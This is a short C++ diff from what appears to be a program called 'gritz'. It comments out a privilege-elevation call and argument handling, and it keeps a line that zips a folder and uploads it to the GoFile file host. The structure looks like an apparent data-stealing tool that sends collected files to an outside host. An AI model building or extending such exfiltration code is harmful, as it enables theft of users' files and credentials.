@@ -4,12 +4,19 @@ void gritz::cGritz::Start(char** args)
 {
 	gritz::paths::initPaths();
 
-	if (args[1] == nullptr)
-	{
-	}
-	else
-	{
-	}
+	//if (gritz::Elevation::elevate())
+	//{
+	//	std::cout << "hi";
+	//}
+
+	//if (args[1] == nullptr)
+	//{
+	//}
+	//else
+	//{
+	//}
+
+	//std::cin.get();
 
 	std::string url = gritz::upload::GoFileUpload::upload(gritz::upload::zip::ZipFile::create("lolz"));
 
